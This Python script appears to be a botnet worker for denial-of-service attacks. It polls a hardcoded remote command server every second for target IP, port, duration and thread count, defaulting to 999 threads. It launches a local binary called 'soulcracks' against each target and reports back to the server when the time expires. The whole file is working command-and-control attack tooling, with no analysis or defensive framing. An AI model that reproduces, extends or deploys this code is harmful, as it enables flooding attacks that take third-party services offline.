import requests
import subprocess
import time

BASE_URL = 'http://31.97.128.103:3001'
SOUL_PATH = '/tammybysoulcrackkso/'
DONE_PATH = '/tammybysoulcrackkso/done'

active_tasks = {}

def process_new_task(added):
    ip = added.get('ip')
    port = added.get('port')
    time_val = added.get('time')
    thread_val = added.get('thread', 999)  # Default to 999 threads

    if ip and port and time_val:
        key = (ip, str(port), str(time_val), str(thread_val))
        if key not in active_tasks:
            print(f"[+] New task added: IP={ip}, Port={port}, Time={time_val}, Threads={thread_val}")
            try:
                # Launch ./soulcracks binary with thread parameter
                # Format: ./soulcracks ip port time thread
                process = subprocess.Popen(['./soulcracks', ip, str(port), str(time_val), str(thread_val)])
                print(f"[+] Launched binary: ./soulcracks {ip} {port} {time_val} {thread_val} (PID: {process.pid})")
                
            except Exception as e:
                print(f"[!] Failed to launch binary: {e}")
            active_tasks[key] = int(time_val) 
        else:
            # Task already running
            pass
    else:
        print("[!] Task received but missing ip, port, or time values")

def main_loop():
    while True:
        try:
            response = requests.get(f'{BASE_URL}{SOUL_PATH}')
            response.raise_for_status()
            data = response.json()
            
            # Handle different response formats
            if isinstance(data, dict):
                if data.get('success') and 'added' in data:
                    process_new_task(data['added'])
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and item.get('success') and 'added' in item:
                        process_new_task(item['added'])
            
            # Countdown and cleanup for active tasks
            tasks_to_delete = []
            for key in list(active_tasks.keys()):
                active_tasks[key] -= 1
                if active_tasks[key] <= 0:
                    ip, port, orig_time, thread_val = key
                    print(f"[+] Time expired for task: IP={ip}, Port={port}, Time={orig_time}, Threads={thread_val}")
                    try:
                        # Send delete request with thread parameter
                        del_resp = requests.get(f'{BASE_URL}{DONE_PATH}',
                                                params={
                                                    'ip': ip, 
                                                    'port': port, 
                                                    'time': orig_time,
                                                    'thread': thread_val
                                                })
                        if del_resp.status_code == 200:
                            print(f"[+] Sent delete request for IP={ip}, Port={port}, Time={orig_time}, Threads={thread_val}")
                        else:
                            print(f"[!] Delete request failed with status: {del_resp.status_code}")
                    except Exception as e:
                        print(f"[!] Failed to send delete request: {e}")
                    tasks_to_delete.append(key)
            
            # Remove completed tasks
            for key in tasks_to_delete:
                active_tasks.pop(key, None)

            time.sleep(1)
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
            time.sleep(1)
        except Exception as e:
            print(f"[!] General error: {e}")
            time.sleep(1)

if __name__ == '__main__':
    main_loop()